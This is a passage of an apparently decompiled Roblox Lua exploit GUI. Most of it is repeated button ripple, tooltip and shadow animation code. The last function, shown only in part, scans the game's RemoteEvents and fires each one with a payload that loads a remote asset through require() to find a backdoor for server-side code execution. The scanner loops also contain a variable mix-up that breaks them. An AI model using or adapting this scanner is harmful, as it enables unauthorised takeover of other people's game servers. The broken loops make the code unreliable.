				if Button.ScaleType == Enum.ScaleType.Slice then
					Frame.SliceCenter = Button.SliceCenter
				elseif Button.ScaleType == Enum.ScaleType.Tile then
					Frame.TileSize = Button.TileSize
				end
			end
		end
	end
	chcolor()
	animated_Color.Changed:Connect(chcolor)

	local RippleName = 0
	local back_use = false
	local use = false
	local Active = false
	function on(x, y)
		if Active == false then
			Active = true
			if use == false then
				use = true
				Shadow_drog.Size = UDim2.new(1,12,1,13)

				if UseParentColor.Value == true then
					if Button.ClassName == "ImageButton" then
						animated_Rounded.ImageColor3 = Button.ImageColor3
						Frame.BackgroundColor3 = Button.ImageColor3
					else
						animated_Rounded.ImageColor3 = Button.BackgroundColor3
						Frame.BackgroundColor3 = Button.BackgroundColor3
					end		
				end

				RippleName=RippleName+1
				for i,v in pairs(RippleFrame:GetChildren()) do
					animated_Rounded.Position = UDim2.new(0, x - v.AbsolutePosition.X, 0, y - v.AbsolutePosition.Y - 35)
					animated_Rounded.Size = UDim2.new(0 ,0 ,0, 0)
					local new = animated_Rounded:Clone()
					new.Parent = v
					new.Name = RippleName
					new.ZIndex = 3
					local Size = 0
					local Time = 0.6
					if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.X*1.5 
					elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.Y*1.5 
					elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.X*1.5 
					end
					new:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0, Button.AbsoluteSize.X/2+(Button.AbsolutePosition.X-v.AbsolutePosition.X), 0, Button.AbsoluteSize.Y/2+(Button.AbsolutePosition.Y-v.AbsolutePosition.Y)), "Out", "Quad", Time, true, nil)
				end
				repeat wait() until use == false
				for i,v in pairs(RippleFrame:GetChildren()) do
					local RippleTrans = v:FindFirstChild(RippleName)
					RippleOut:Fire(RippleTrans,v)	
				end
				Active = false
			end
		end
	end
	RippleOut.Event:Connect(function(RippleTrans,RippleTransPoint)
		local Size = 0
		local Time = 0.4
		if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.X*1.5 
		elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.Y*1.5 
		elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.X*1.5 
		end
		RippleTrans:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0, Button.AbsoluteSize.X/2+(Button.AbsolutePosition.X-RippleTransPoint.AbsolutePosition.X), 0, Button.AbsoluteSize.Y/2+(Button.AbsolutePosition.Y-RippleTransPoint.AbsolutePosition.Y)), "Out", "Quad", Time, true, nil)
		repeat
			RippleTrans.ImageTransparency = RippleTrans.ImageTransparency + 0.02
			wait(0.001)
		until RippleTrans.ImageTransparency > 0.99
		RippleTrans:Destroy()
	end)

	function off()
		Shadow_drog.Size = UDim2.new(1,10,1,12)

		use = false
	end
	function off2()
		back_use = false
		Shadow_drog.Size = UDim2.new(1,10,1,11)

		use = false
	end
	function tran()
		back_use = true
		if Transparency.Value == true then
			while true do wait(0.04)
				if back_use == true then
					if Button.ClassName == "ImageButton" then
						if Frame.ImageTransparency < 0.85 then else 
							Frame.ImageTransparency = Frame.ImageTransparency - 0.1
						end
					else
						if Frame.BackgroundTransparency < 0.85 then else 
							Frame.BackgroundTransparency = Frame.BackgroundTransparency - 0.1
						end
					end
				else 
					if Button.ClassName == "ImageButton" then
						if Frame.ImageTransparency == 1 or Frame.ImageTransparency > 1 then break else
							Frame.ImageTransparency = Frame.ImageTransparency + 0.1
						end
					else
						if Frame.BackgroundTransparency == 1 or Frame.BackgroundTransparency > 1 then break else
							Frame.BackgroundTransparency = Frame.BackgroundTransparency + 0.1
						end
					end
				end
			end
		end
	end

	function ToolTipOn()
		if Tooltip.Value == "" then else
			if TooltipFrameClone:FindFirstChild("TextLabel") then
				local TooltipTextLabel = TooltipFrameClone:FindFirstChild("TextLabel")
				TooltipTextLabel.Text = Tooltip.Value 
				TooltipFrameClone.Size = UDim2.new(TooltipFrameClone.Size.X.Scale,TooltipTextLabel.TextBounds.X+4,TooltipFrameClone.Size.Y.Scale,TooltipFrameClone.Size.Y.Offset)
				repeat wait(0.015)
					TooltipFrameClone.ImageTransparency = TooltipFrameClone.ImageTransparency - 0.1
					TooltipTextLabel.TextTransparency = TooltipTextLabel.TextTransparency - 0.1
				until TooltipFrameClone.ImageTransparency < 0.1 or back_use == false
				repeat wait() until back_use == false
				repeat wait(0.015)
					TooltipFrameClone.ImageTransparency = TooltipFrameClone.ImageTransparency + 0.1
					TooltipTextLabel.TextTransparency = TooltipTextLabel.TextTransparency + 0.1
				until TooltipFrameClone.ImageTransparency > 0.9 or back_use == true
			end
		end
	end
	function Enter_shadow()
		Shadow_drog.Size = UDim2.new(1,10,1,12)

	end

	Button.MouseButton1Click:Connect(off)
	Button.MouseButton1Down:Connect(on)
	Button.MouseEnter:Connect(tran)
	Button.MouseEnter:Connect(ToolTipOn)
	Button.MouseLeave:Connect(off2)
	Button.MouseEnter:Connect(Enter_shadow)

end;
task.spawn(C_7);

local function C_15()
	local script = DSC["15"];
	local save = "229, 229, 229"
	local Button = script.Parent
	function active_button()

	end

	local Ripplename = script:WaitForChild("Ripplename")
	local Transparency = script:WaitForChild("Transparency")
	local UseParentColor = script:WaitForChild("UseParentColor")
	local animated_Color = script:WaitForChild("animated_Color")
	local DropShadow3 = script:WaitForChild("DropShadow3")
	local RippleContainer = script:WaitForChild("RippleContainer")
	local animated_Rounded = script:WaitForChild("animated_Rounded")
	local shadow = script:WaitForChild("shadow")
	local Tooltip = script:WaitForChild("Tooltip")
	local TooltipFrame = script:WaitForChild("TooltipFrame")

	local TooltipFrameClone = TooltipFrame:Clone()
	TooltipFrameClone.Parent = Button

	local Shadow_drog = shadow:Clone()
	local Shadow = DropShadow3:Clone()
	Shadow.Parent = Button

	local Frame = Instance.new("ImageLabel", Button)
	Frame.ClipsDescendants = true
	Frame.BackgroundTransparency = 1
	Frame.BorderSizePixel = 0
	Frame.Size = UDim2.new(1, 0, 1, 0)
	Frame.Position = UDim2.new(0, 0, 0, 0)
	Frame.BackgroundColor3 = animated_Color.Value
	Frame.Name = "TransIn"
	if Button:IsA("ImageButton") then
		Frame.Image = Button.Image
	else
		Frame.Image = ""
	end

	local BackCheck = Instance.new("Frame",Button)
	BackCheck.Size = UDim2.new(1,0,1,0)
	BackCheck.Position = UDim2.new(0,0,0,0)
	BackCheck.BackgroundTransparency = 1
	BackCheck.BorderSizePixel = 0
	BackCheck.Name = "BackFrame"

	local RippleOut = Instance.new("BindableEvent",script)
	RippleOut.Name = "RippleOut"

	Frame.ImageTransparency = 1
	Button.AutoButtonColor = false
	Shadow_drog.Parent = Button
	Frame.ZIndex = 3
	Button.ZIndex = 2
	RippleFrame = RippleContainer:Clone()
	RippleFrame.Parent = Button

	function chcolor()
		if UseParentColor.Value == true then
			if Button.ClassName == "ImageButton" then
				animated_Rounded.ImageColor3 = Button.ImageColor3
				Frame.BackgroundColor3 = Button.ImageColor3
				Frame.ImageColor3 = Button.ImageColor3
			else
				animated_Rounded.ImageColor3 = Button.BackgroundColor3
				Frame.BackgroundColor3 = Button.BackgroundColor3
				Frame.ImageColor3 = Button.BackgroundColor3
			end
		else
			animated_Rounded.ImageColor3 = animated_Color.Value
			Frame.BackgroundColor3 = animated_Color.Value
			Frame.ImageColor3 = animated_Color.Value
			if Button.ClassName == "ImageButton" then
				Frame.ScaleType = Button.ScaleType
				if Button.ScaleType == Enum.ScaleType.Slice then
					Frame.SliceCenter = Button.SliceCenter
				elseif Button.ScaleType == Enum.ScaleType.Tile then
					Frame.TileSize = Button.TileSize
				end
			end
		end
	end
	chcolor()
	animated_Color.Changed:Connect(chcolor)

	local RippleName = 0
	local back_use = false
	local use = false
	local Active = false
	function on(x, y)
		if Active == false then
			Active = true
			if use == false then
				use = true
				Shadow_drog.Size = UDim2.new(1,12,1,13)

				if UseParentColor.Value == true then
					if Button.ClassName == "ImageButton" then
						animated_Rounded.ImageColor3 = Button.ImageColor3
						Frame.BackgroundColor3 = Button.ImageColor3
					else
						animated_Rounded.ImageColor3 = Button.BackgroundColor3
						Frame.BackgroundColor3 = Button.BackgroundColor3
					end		
				end

				RippleName=RippleName+1
				for i,v in pairs(RippleFrame:GetChildren()) do
					animated_Rounded.Position = UDim2.new(0, x - v.AbsolutePosition.X, 0, y - v.AbsolutePosition.Y - 35)
					animated_Rounded.Size = UDim2.new(0 ,0 ,0, 0)
					local new = animated_Rounded:Clone()
					new.Parent = v
					new.Name = RippleName
					new.ZIndex = 3
					local Size = 0
					local Time = 0.6
					if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.X*1.5 
					elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.Y*1.5 
					elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.X*1.5 
					end
					new:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0, Button.AbsoluteSize.X/2+(Button.AbsolutePosition.X-v.AbsolutePosition.X), 0, Button.AbsoluteSize.Y/2+(Button.AbsolutePosition.Y-v.AbsolutePosition.Y)), "Out", "Quad", Time, true, nil)
				end
				repeat wait() until use == false
				for i,v in pairs(RippleFrame:GetChildren()) do
					local RippleTrans = v:FindFirstChild(RippleName)
					RippleOut:Fire(RippleTrans,v)	
				end
				Active = false
			end
		end
	end
	RippleOut.Event:Connect(function(RippleTrans,RippleTransPoint)
		local Size = 0
		local Time = 0.4
		if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.X*1.5 
		elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.Y*1.5 
		elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.X*1.5 
		end
		RippleTrans:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0, Button.AbsoluteSize.X/2+(Button.AbsolutePosition.X-RippleTransPoint.AbsolutePosition.X), 0, Button.AbsoluteSize.Y/2+(Button.AbsolutePosition.Y-RippleTransPoint.AbsolutePosition.Y)), "Out", "Quad", Time, true, nil)
		repeat
			RippleTrans.ImageTransparency = RippleTrans.ImageTransparency + 0.02
			wait(0.001)
		until RippleTrans.ImageTransparency > 0.99
		RippleTrans:Destroy()
	end)

	function off()
		Shadow_drog.Size = UDim2.new(1,10,1,12)

		use = false
	end
	function off2()
		back_use = false
		Shadow_drog.Size = UDim2.new(1,10,1,11)

		use = false
	end
	function tran()
		back_use = true
		if Transparency.Value == true then
			while true do wait(0.04)
				if back_use == true then
					if Button.ClassName == "ImageButton" then
						if Frame.ImageTransparency < 0.85 then else 
							Frame.ImageTransparency = Frame.ImageTransparency - 0.1
						end
					else
						if Frame.BackgroundTransparency < 0.85 then else 
							Frame.BackgroundTransparency = Frame.BackgroundTransparency - 0.1
						end
					end
				else 
					if Button.ClassName == "ImageButton" then
						if Frame.ImageTransparency == 1 or Frame.ImageTransparency > 1 then break else
							Frame.ImageTransparency = Frame.ImageTransparency + 0.1
						end
					else
						if Frame.BackgroundTransparency == 1 or Frame.BackgroundTransparency > 1 then break else
							Frame.BackgroundTransparency = Frame.BackgroundTransparency + 0.1
						end
					end
				end
			end
		end
	end

	function ToolTipOn()
		if Tooltip.Value == "" then else
			if TooltipFrameClone:FindFirstChild("TextLabel") then
				local TooltipTextLabel = TooltipFrameClone:FindFirstChild("TextLabel")
				TooltipTextLabel.Text = Tooltip.Value 
				TooltipFrameClone.Size = UDim2.new(TooltipFrameClone.Size.X.Scale,TooltipTextLabel.TextBounds.X+4,TooltipFrameClone.Size.Y.Scale,TooltipFrameClone.Size.Y.Offset)
				repeat wait(0.015)
					TooltipFrameClone.ImageTransparency = TooltipFrameClone.ImageTransparency - 0.1
					TooltipTextLabel.TextTransparency = TooltipTextLabel.TextTransparency - 0.1
				until TooltipFrameClone.ImageTransparency < 0.1 or back_use == false
				repeat wait() until back_use == false
				repeat wait(0.015)
					TooltipFrameClone.ImageTransparency = TooltipFrameClone.ImageTransparency + 0.1
					TooltipTextLabel.TextTransparency = TooltipTextLabel.TextTransparency + 0.1
				until TooltipFrameClone.ImageTransparency > 0.9 or back_use == true
			end
		end
	end
	function Enter_shadow()
		Shadow_drog.Size = UDim2.new(1,10,1,12)

	end

	Button.MouseButton1Click:Connect(off)
	Button.MouseButton1Down:Connect(on)
	Button.MouseEnter:Connect(tran)
	Button.MouseEnter:Connect(ToolTipOn)
	Button.MouseLeave:Connect(off2)
	Button.MouseEnter:Connect(Enter_shadow)

end;
task.spawn(C_15);

local function C_23()
	local script = DSC["23"];
	local save = "229, 229, 229"
	local Button = script.Parent
	function active_button()

	end

	local Ripplename = script:WaitForChild("Ripplename")
	local Transparency = script:WaitForChild("Transparency")
	local UseParentColor = script:WaitForChild("UseParentColor")
	local animated_Color = script:WaitForChild("animated_Color")
	local DropShadow3 = script:WaitForChild("DropShadow3")
	local RippleContainer = script:WaitForChild("RippleContainer")
	local animated_Rounded = script:WaitForChild("animated_Rounded")
	local shadow = script:WaitForChild("shadow")
	local Tooltip = script:WaitForChild("Tooltip")
	local TooltipFrame = script:WaitForChild("TooltipFrame")

	local TooltipFrameClone = TooltipFrame:Clone()
	TooltipFrameClone.Parent = Button

	local Shadow_drog = shadow:Clone()
	local Shadow = DropShadow3:Clone()
	Shadow.Parent = Button

	local Frame = Instance.new("ImageLabel", Button)
	Frame.ClipsDescendants = true
	Frame.BackgroundTransparency = 1
	Frame.BorderSizePixel = 0
	Frame.Size = UDim2.new(1, 0, 1, 0)
	Frame.Position = UDim2.new(0, 0, 0, 0)
	Frame.BackgroundColor3 = animated_Color.Value
	Frame.Name = "TransIn"
	if Button:IsA("ImageButton") then
		Frame.Image = Button.Image
	else
		Frame.Image = ""
	end

	local BackCheck = Instance.new("Frame",Button)
	BackCheck.Size = UDim2.new(1,0,1,0)
	BackCheck.Position = UDim2.new(0,0,0,0)
	BackCheck.BackgroundTransparency = 1
	BackCheck.BorderSizePixel = 0
	BackCheck.Name = "BackFrame"

	local RippleOut = Instance.new("BindableEvent",script)
	RippleOut.Name = "RippleOut"

	Frame.ImageTransparency = 1
	Button.AutoButtonColor = false
	Shadow_drog.Parent = Button
	Frame.ZIndex = 3
	Button.ZIndex = 2
	RippleFrame = RippleContainer:Clone()
	RippleFrame.Parent = Button

	function chcolor()
		if UseParentColor.Value == true then
			if Button.ClassName == "ImageButton" then
				animated_Rounded.ImageColor3 = Button.ImageColor3
				Frame.BackgroundColor3 = Button.ImageColor3
				Frame.ImageColor3 = Button.ImageColor3
			else
				animated_Rounded.ImageColor3 = Button.BackgroundColor3
				Frame.BackgroundColor3 = Button.BackgroundColor3
				Frame.ImageColor3 = Button.BackgroundColor3
			end
		else
			animated_Rounded.ImageColor3 = animated_Color.Value
			Frame.BackgroundColor3 = animated_Color.Value
			Frame.ImageColor3 = animated_Color.Value
			if Button.ClassName == "ImageButton" then
				Frame.ScaleType = Button.ScaleType
				if Button.ScaleType == Enum.ScaleType.Slice then
					Frame.SliceCenter = Button.SliceCenter
				elseif Button.ScaleType == Enum.ScaleType.Tile then
					Frame.TileSize = Button.TileSize
				end
			end
		end
	end
	chcolor()
	animated_Color.Changed:Connect(chcolor)

	local RippleName = 0
	local back_use = false
	local use = false
	local Active = false
	function on(x, y)
		if Active == false then
			Active = true
			if use == false then
				use = true
				Shadow_drog.Size = UDim2.new(1,12,1,13)

				if UseParentColor.Value == true then
					if Button.ClassName == "ImageButton" then
						animated_Rounded.ImageColor3 = Button.ImageColor3
						Frame.BackgroundColor3 = Button.ImageColor3
					else
						animated_Rounded.ImageColor3 = Button.BackgroundColor3
						Frame.BackgroundColor3 = Button.BackgroundColor3
					end		
				end

				RippleName=RippleName+1
				for i,v in pairs(RippleFrame:GetChildren()) do
					animated_Rounded.Position = UDim2.new(0, x - v.AbsolutePosition.X, 0, y - v.AbsolutePosition.Y - 35)
					animated_Rounded.Size = UDim2.new(0 ,0 ,0, 0)
					local new = animated_Rounded:Clone()
					new.Parent = v
					new.Name = RippleName
					new.ZIndex = 3
					local Size = 0
					local Time = 0.6
					if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.X*1.5 
					elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.Y*1.5 
					elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.X*1.5 
					end
					new:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0, Button.AbsoluteSize.X/2+(Button.AbsolutePosition.X-v.AbsolutePosition.X), 0, Button.AbsoluteSize.Y/2+(Button.AbsolutePosition.Y-v.AbsolutePosition.Y)), "Out", "Quad", Time, true, nil)
				end
				repeat wait() until use == false
				for i,v in pairs(RippleFrame:GetChildren()) do
					local RippleTrans = v:FindFirstChild(RippleName)
					RippleOut:Fire(RippleTrans,v)	
				end
				Active = false
			end
		end
	end
	RippleOut.Event:Connect(function(RippleTrans,RippleTransPoint)
		local Size = 0
		local Time = 0.4
		if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.X*1.5 
		elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.Y*1.5 
		elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.X*1.5 
		end
		RippleTrans:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0, Button.AbsoluteSize.X/2+(Button.AbsolutePosition.X-RippleTransPoint.AbsolutePosition.X), 0, Button.AbsoluteSize.Y/2+(Button.AbsolutePosition.Y-RippleTransPoint.AbsolutePosition.Y)), "Out", "Quad", Time, true, nil)
		repeat
			RippleTrans.ImageTransparency = RippleTrans.ImageTransparency + 0.02
			wait(0.001)
		until RippleTrans.ImageTransparency > 0.99
		RippleTrans:Destroy()
	end)

	function off()
		Shadow_drog.Size = UDim2.new(1,10,1,12)

		use = false
	end
	function off2()
		back_use = false
		Shadow_drog.Size = UDim2.new(1,10,1,11)

		use = false
	end
	function tran()
		back_use = true
		if Transparency.Value == true then
			while true do wait(0.04)
				if back_use == true then
					if Button.ClassName == "ImageButton" then
						if Frame.ImageTransparency < 0.85 then else 
							Frame.ImageTransparency = Frame.ImageTransparency - 0.1
						end
					else
						if Frame.BackgroundTransparency < 0.85 then else 
							Frame.BackgroundTransparency = Frame.BackgroundTransparency - 0.1
						end
					end
				else 
					if Button.ClassName == "ImageButton" then
						if Frame.ImageTransparency == 1 or Frame.ImageTransparency > 1 then break else
							Frame.ImageTransparency = Frame.ImageTransparency + 0.1
						end
					else
						if Frame.BackgroundTransparency == 1 or Frame.BackgroundTransparency > 1 then break else
							Frame.BackgroundTransparency = Frame.BackgroundTransparency + 0.1
						end
					end
				end
			end
		end
	end

	function ToolTipOn()
		if Tooltip.Value == "" then else
			if TooltipFrameClone:FindFirstChild("TextLabel") then
				local TooltipTextLabel = TooltipFrameClone:FindFirstChild("TextLabel")
				TooltipTextLabel.Text = Tooltip.Value 
				TooltipFrameClone.Size = UDim2.new(TooltipFrameClone.Size.X.Scale,TooltipTextLabel.TextBounds.X+4,TooltipFrameClone.Size.Y.Scale,TooltipFrameClone.Size.Y.Offset)
				repeat wait(0.015)
					TooltipFrameClone.ImageTransparency = TooltipFrameClone.ImageTransparency - 0.1
					TooltipTextLabel.TextTransparency = TooltipTextLabel.TextTransparency - 0.1
				until TooltipFrameClone.ImageTransparency < 0.1 or back_use == false
				repeat wait() until back_use == false
				repeat wait(0.015)
					TooltipFrameClone.ImageTransparency = TooltipFrameClone.ImageTransparency + 0.1
					TooltipTextLabel.TextTransparency = TooltipTextLabel.TextTransparency + 0.1
				until TooltipFrameClone.ImageTransparency > 0.9 or back_use == true
			end
		end
	end
	function Enter_shadow()
		Shadow_drog.Size = UDim2.new(1,10,1,12)

	end

	Button.MouseButton1Click:Connect(off)
	Button.MouseButton1Down:Connect(on)
	Button.MouseEnter:Connect(tran)
	Button.MouseEnter:Connect(ToolTipOn)
	Button.MouseLeave:Connect(off2)
	Button.MouseEnter:Connect(Enter_shadow)

end;
task.spawn(C_23);

local function C_33()
	local script = DSC["33"];
	local save = "229, 229, 229"
	local Button = script.Parent
	function active_button()

	end

	local Ripplename = script:WaitForChild("Ripplename")
	local Transparency = script:WaitForChild("Transparency")
	local UseParentColor = script:WaitForChild("UseParentColor")
	local animated_Color = script:WaitForChild("animated_Color")
	local DropShadow3 = script:WaitForChild("DropShadow3")
	local RippleContainer = script:WaitForChild("RippleContainer")
	local animated_Rounded = script:WaitForChild("animated_Rounded")
	local shadow = script:WaitForChild("shadow")
	local Tooltip = script:WaitForChild("Tooltip")
	local TooltipFrame = script:WaitForChild("TooltipFrame")

	local TooltipFrameClone = TooltipFrame:Clone()
	TooltipFrameClone.Parent = Button

	local Shadow_drog = shadow:Clone()
	local Shadow = DropShadow3:Clone()
	Shadow.Parent = Button

	local Frame = Instance.new("ImageLabel", Button)
	Frame.ClipsDescendants = true
	Frame.BackgroundTransparency = 1
	Frame.BorderSizePixel = 0
	Frame.Size = UDim2.new(1, 0, 1, 0)
	Frame.Position = UDim2.new(0, 0, 0, 0)
	Frame.BackgroundColor3 = animated_Color.Value
	Frame.Name = "TransIn"
	if Button:IsA("ImageButton") then
		Frame.Image = Button.Image
	else
		Frame.Image = ""
	end

	local BackCheck = Instance.new("Frame",Button)
	BackCheck.Size = UDim2.new(1,0,1,0)
	BackCheck.Position = UDim2.new(0,0,0,0)
	BackCheck.BackgroundTransparency = 1
	BackCheck.BorderSizePixel = 0
	BackCheck.Name = "BackFrame"

	local RippleOut = Instance.new("BindableEvent",script)
	RippleOut.Name = "RippleOut"

	Frame.ImageTransparency = 1
	Button.AutoButtonColor = false
	Shadow_drog.Parent = Button
	Frame.ZIndex = 3
	Button.ZIndex = 2
	RippleFrame = RippleContainer:Clone()
	RippleFrame.Parent = Button

	function chcolor()
		if UseParentColor.Value == true then
			if Button.ClassName == "ImageButton" then
				animated_Rounded.ImageColor3 = Button.ImageColor3
				Frame.BackgroundColor3 = Button.ImageColor3
				Frame.ImageColor3 = Button.ImageColor3
			else
				animated_Rounded.ImageColor3 = Button.BackgroundColor3
				Frame.BackgroundColor3 = Button.BackgroundColor3
				Frame.ImageColor3 = Button.BackgroundColor3
			end
		else
			animated_Rounded.ImageColor3 = animated_Color.Value
			Frame.BackgroundColor3 = animated_Color.Value
			Frame.ImageColor3 = animated_Color.Value
			if Button.ClassName == "ImageButton" then
				Frame.ScaleType = Button.ScaleType
				if Button.ScaleType == Enum.ScaleType.Slice then
					Frame.SliceCenter = Button.SliceCenter
				elseif Button.ScaleType == Enum.ScaleType.Tile then
					Frame.TileSize = Button.TileSize
				end
			end
		end
	end
	chcolor()
	animated_Color.Changed:Connect(chcolor)

	local RippleName = 0
	local back_use = false
	local use = false
	local Active = false
	function on(x, y)
		if Active == false then
			Active = true
			if use == false then
				use = true
				Shadow_drog.Size = UDim2.new(1,12,1,13)

				if UseParentColor.Value == true then
					if Button.ClassName == "ImageButton" then
						animated_Rounded.ImageColor3 = Button.ImageColor3
						Frame.BackgroundColor3 = Button.ImageColor3
					else
						animated_Rounded.ImageColor3 = Button.BackgroundColor3
						Frame.BackgroundColor3 = Button.BackgroundColor3
					end		
				end

				RippleName=RippleName+1
				for i,v in pairs(RippleFrame:GetChildren()) do
					animated_Rounded.Position = UDim2.new(0, x - v.AbsolutePosition.X, 0, y - v.AbsolutePosition.Y - 35)
					animated_Rounded.Size = UDim2.new(0 ,0 ,0, 0)
					local new = animated_Rounded:Clone()
					new.Parent = v
					new.Name = RippleName
					new.ZIndex = 3
					local Size = 0
					local Time = 0.6
					if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.X*1.5 
					elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.Y*1.5 
					elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
						Size = Button.AbsoluteSize.X*1.5 
					end
					new:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0, Button.AbsoluteSize.X/2+(Button.AbsolutePosition.X-v.AbsolutePosition.X), 0, Button.AbsoluteSize.Y/2+(Button.AbsolutePosition.Y-v.AbsolutePosition.Y)), "Out", "Quad", Time, true, nil)
				end
				repeat wait() until use == false
				for i,v in pairs(RippleFrame:GetChildren()) do
					local RippleTrans = v:FindFirstChild(RippleName)
					RippleOut:Fire(RippleTrans,v)	
				end
				Active = false
			end
		end
	end
	RippleOut.Event:Connect(function(RippleTrans,RippleTransPoint)
		local Size = 0
		local Time = 0.4
		if Button.AbsoluteSize.X > Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.X*1.5 
		elseif Button.AbsoluteSize.X < Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.Y*1.5 
		elseif Button.AbsoluteSize.X == Button.AbsoluteSize.Y then
			Size = Button.AbsoluteSize.X*1.5 
		end
		RippleTrans:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0, Button.AbsoluteSize.X/2+(Button.AbsolutePosition.X-RippleTransPoint.AbsolutePosition.X), 0, Button.AbsoluteSize.Y/2+(Button.AbsolutePosition.Y-RippleTransPoint.AbsolutePosition.Y)), "Out", "Quad", Time, true, nil)
		repeat
			RippleTrans.ImageTransparency = RippleTrans.ImageTransparency + 0.02
			wait(0.001)
		until RippleTrans.ImageTransparency > 0.99
		RippleTrans:Destroy()
	end)

	function off()
		Shadow_drog.Size = UDim2.new(1,10,1,12)

		use = false
	end
	function off2()
		back_use = false
		Shadow_drog.Size = UDim2.new(1,10,1,11)

		use = false
	end
	function tran()
		back_use = true
		if Transparency.Value == true then
			while true do wait(0.04)
				if back_use == true then
					if Button.ClassName == "ImageButton" then
						if Frame.ImageTransparency < 0.85 then else 
							Frame.ImageTransparency = Frame.ImageTransparency - 0.1
						end
					else
						if Frame.BackgroundTransparency < 0.85 then else 
							Frame.BackgroundTransparency = Frame.BackgroundTransparency - 0.1
						end
					end
				else 
					if Button.ClassName == "ImageButton" then
						if Frame.ImageTransparency == 1 or Frame.ImageTransparency > 1 then break else
							Frame.ImageTransparency = Frame.ImageTransparency + 0.1
						end
					else
						if Frame.BackgroundTransparency == 1 or Frame.BackgroundTransparency > 1 then break else
							Frame.BackgroundTransparency = Frame.BackgroundTransparency + 0.1
						end
					end
				end
			end
		end
	end

	function ToolTipOn()
		if Tooltip.Value == "" then else
			if TooltipFrameClone:FindFirstChild("TextLabel") then
				local TooltipTextLabel = TooltipFrameClone:FindFirstChild("TextLabel")
				TooltipTextLabel.Text = Tooltip.Value 
				TooltipFrameClone.Size = UDim2.new(TooltipFrameClone.Size.X.Scale,TooltipTextLabel.TextBounds.X+4,TooltipFrameClone.Size.Y.Scale,TooltipFrameClone.Size.Y.Offset)
				repeat wait(0.015)
					TooltipFrameClone.ImageTransparency = TooltipFrameClone.ImageTransparency - 0.1
					TooltipTextLabel.TextTransparency = TooltipTextLabel.TextTransparency - 0.1
				until TooltipFrameClone.ImageTransparency < 0.1 or back_use == false
				repeat wait() until back_use == false
				repeat wait(0.015)
					TooltipFrameClone.ImageTransparency = TooltipFrameClone.ImageTransparency + 0.1
					TooltipTextLabel.TextTransparency = TooltipTextLabel.TextTransparency + 0.1
				until TooltipFrameClone.ImageTransparency > 0.9 or back_use == true
			end
		end
	end
	function Enter_shadow()
		Shadow_drog.Size = UDim2.new(1,10,1,12)

	end

	Button.MouseButton1Click:Connect(off)
	Button.MouseButton1Down:Connect(on)
	Button.MouseEnter:Connect(tran)
	Button.MouseEnter:Connect(ToolTipOn)
	Button.MouseLeave:Connect(off2)
	Button.MouseEnter:Connect(Enter_shadow)

end;
task.spawn(C_33);

local function C_40()
	local script = DSC["40"];

	local frame=script.Parent.Frame.TextLabel
	local scanner=frame.scanner
	local foundRem=nil
	local player=game.Players.LocalPlayer
	local executor=frame.exec

	function vulnerability()
		local gui = "guitars"
		for _, obj in pairs(game.ReplicatedStorage:GetDescendants()) do
			if obj:IsA("RemoteEvent") then
				wait(1)
				print("[DS] Checking " .. obj.Name .. " for vulnerability")
				local dummy = "require(15349730165).newDummy(CFrame.new(-21, 17.585, -21), game.ReplicatedStorage)"
				obj:FireServer(dummy)
				wait(1)
				if vulncheck(gui) then
					print("[DS] Found vulnerability in " .. obj.Name)
					return obj
				end

			end
		end
		for _, obj2 in pairs(game.ReplicatedFirst:GetDescendants()) do
			if obj:IsA("RemoteEvent") then
				wait(1)
				print("[DS] Checking " .. obj.Name .. " for vulnerability")
				local dummy = "require(15349730165).newDummy(CFrame.new(-21, 17.585, -21), game.ReplicatedStorage)"
				obj:FireServer(dummy)
				wait(1)
				if vulncheck(gui) then
					print("[DS] Found vulnerability in " .. obj.Name)
					return obj
				end

			end
		end
		for _, obj3 in pairs(game.Workspace:GetDescendants()) do
			if obj:IsA("RemoteEvent") then
				wait(1)
				print("[DS] Checking " .. obj.Name .. " for vulnerability")
				local dummy = "require(15349730165).newDummy(CFrame.new(-21, 17.585, -21), game.ReplicatedStorage)"
				obj:FireServer(dummy)
				wait(1)
				if vulncheck(gui) then
					print("[DS] Found vulnerability in " .. obj.Name)
					return obj
				end

			end
		end
		print("[DS] No vulnerabilities found.")
		return nil
	end
	function vulncheck(g)
